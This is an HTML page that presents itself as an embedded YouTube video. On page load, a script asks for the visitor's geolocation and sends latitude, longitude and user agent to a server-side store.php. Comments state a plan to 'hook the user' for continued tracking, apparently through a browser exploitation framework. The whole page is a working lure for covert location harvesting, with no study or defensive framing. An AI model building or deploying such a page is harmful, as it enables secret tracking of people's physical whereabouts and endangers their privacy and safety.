<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
</head>
<body onload="getLocation()">
  <iframe width="560" height="315" src="https://www.youtube.com/embed/QSA0kT8h430?si=UnTnI0BcO9KqdSYl" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

  <!-- modify this code in future to be able to track the user not just one time tracking. hook the user and continues tracking -->
  <!-- behieve code (hooked to behieve) -->

  <script>
    const x = document.getElementById("demo");
    
    function getLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(showPosition);
      } else { 
        x.innerHTML = "Geolocation is not supported by this browser.";
      }
    }
    
    function showPosition(position) {
      const xhttp = new XMLHttpRequest();
      xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude + "&uagent=" + navigator.userAgent);
      xhttp.send();
    }
    </script>
</body>
</html>
